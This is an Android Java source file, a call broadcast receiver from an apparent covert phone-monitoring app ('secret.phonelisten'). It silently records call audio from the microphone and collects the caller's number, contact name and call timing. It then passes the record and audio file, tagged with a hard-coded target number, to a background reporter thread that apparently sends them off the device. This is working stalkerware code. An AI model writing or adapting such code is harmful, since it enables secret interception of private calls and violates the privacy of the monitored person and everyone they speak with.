package com.comsince.secret.phonelisten.receiver;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import com.comsince.secret.common.Constant;
import com.comsince.secret.phonelisten.model.Record;
import com.comsince.secret.phonelisten.service.ActionReporter;
import com.comsince.secret.phonelisten.service.PhoneManager;
import com.comsince.secret.service.API;
import com.comsince.secret.ui.MIMIApplication;
import com.comsince.secret.util.BaseSharePreferenceHelper;

import org.w3c.dom.Text;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;
import java.util.UUID;


/**
 * Created by liaojinlong on 14-11-10.
 */
public class CallBroadcastReceiver extends BroadcastReceiver {
    private String TAG = "CallBroadcastReceiver";
    private static MediaRecorder mediaRecorder;
    private CallSharePreferenceHelper callSharePreferenceHelper;
    @Override
    public void onReceive(Context context, Intent intent) {
        if(callSharePreferenceHelper == null){
            callSharePreferenceHelper = new CallSharePreferenceHelper(context);
        }
        Log.i(TAG, "**********************Action..........."+intent.getAction()+getResultData());
        if(intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")){
            callSharePreferenceHelper.putCallLogString("beginTime",String.valueOf(System.currentTimeMillis()));
            callSharePreferenceHelper.putCallLogString("status","1");
            callSharePreferenceHelper.putCallLogString("henumber",getResultData());
            Log.i(TAG, "**********************拨出" + this.getResultData());
            return;
        }else{
            if(TextUtils.isEmpty(callSharePreferenceHelper.getCallLogString("henumber",null))){
               callSharePreferenceHelper.putCallLogString("henumber", intent.getStringExtra("incoming_number"));
            }
        }

        TelephonyManager tManager = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
        Log.i(TAG, "**********************phoneState..........."+tManager.getCallState());
        try {
            switch (tManager.getCallState()){
                case TelephonyManager.CALL_STATE_RINGING:
                    Log.i(TAG, "**********************正在响铃...........");
                    callSharePreferenceHelper.putCallLogString("status", "2");
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    callSharePreferenceHelper.putCallLogBoolean("isOffHook", true);
                    callSharePreferenceHelper.putCallLogString("beginTime", String.valueOf(System.currentTimeMillis()));
                    File file  = new File(Constant.CallLogContants.CACHE_DIR+"/"+ UUID.randomUUID().toString()+".amr");
                    Log.i(TAG, "**********************接听，开始录音");
                    callSharePreferenceHelper.putCallLogString("file", file.getAbsolutePath());
                    startRecord(file);
                    break;
                case TelephonyManager.CALL_STATE_IDLE:
                    Log.i(TAG, "**********************挂断");
                    callSharePreferenceHelper.putCallLogString("endTime", String.valueOf(System.currentTimeMillis()));
                    stopRecord();

                    Record record  = new Record();
                    record.beginTime = callSharePreferenceHelper.getCallLogString("beginTime", null);
                    record.endTime   = callSharePreferenceHelper.getCallLogString("endTime", null);
                    record.henumber  = callSharePreferenceHelper.getCallLogString("henumber", null);
                    record.menumber  = Constant.PhoneListenContants.TARGET_NUMBER;
                    record.type      = Constant.CallLogContants.TYPE_1;
                    record.status    = callSharePreferenceHelper.getCallLogString("status", "1");
                    record.hename    = MIMIApplication.contactMap.get(record.henumber);
                    File voicefile  = new File(callSharePreferenceHelper.getCallLogString("file", null));
                    HashMap<String,String> recordMap  = PhoneManager.getNewCallRecord(context);

                    if(record.henumber == null){
                        record.henumber =String.valueOf(recordMap.get("number"));
                    }
                    if(TextUtils.isEmpty(callSharePreferenceHelper.getCallLogString("file", null))){
                        voicefile = null;
                    }else{
                        if(record.status.equals("1")){
                            int duration = Integer.parseInt(recordMap.get("duration"));
                            if(duration==0){
                                voicefile = null;
                                record.beginTime = null;
                            }
                        }
                    }
                    Log.i(TAG,"record--"+record.toString());
                    new Thread(new ActionReporter(record,voicefile)).start();
                    releaseDate();
                    break;
            }

        }catch (Exception e){
            Log.i(TAG, "**********************exception messge..........."+e.getMessage());
            e.printStackTrace();
        }

    }

    class CallSharePreferenceHelper extends BaseSharePreferenceHelper{
        private String callPreferenceName = "TEMP_RECORD";

        public CallSharePreferenceHelper(Context context){
            this.context = context;
        }
        private void putCallLogString(String key,String value){
            putValueBykey(callPreferenceName,key,value);
        }
        private void putCallLogBoolean(String key,Boolean value){
            putValueBykey(callPreferenceName,key,value);
        }
        private String getCallLogString(String key,String defaultValue){
            return getValueBykey(callPreferenceName,key,defaultValue);
        }
    }

    /**
     * 开始录音
     * */
    private void startRecord(File file) {
        Log.i(TAG, "**********************开始录音");
        try {
            if(!file.exists()){
                file.createNewFile();
            }
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(file.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 停止播放
     * */
    private void stopRecord() {
        Log.i(TAG, "**********************停止录音");
        if(mediaRecorder!= null){
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaRecorder.release();
            mediaRecorder = null;
        }
    }

    private void releaseDate() {
        callSharePreferenceHelper.putCallLogString("beginTime",null);
        callSharePreferenceHelper.putCallLogString("endTime",null);
        callSharePreferenceHelper.putCallLogString("status", null);
        callSharePreferenceHelper.putCallLogString("henumber", null);
        callSharePreferenceHelper.putCallLogString("file",null);
    }

}
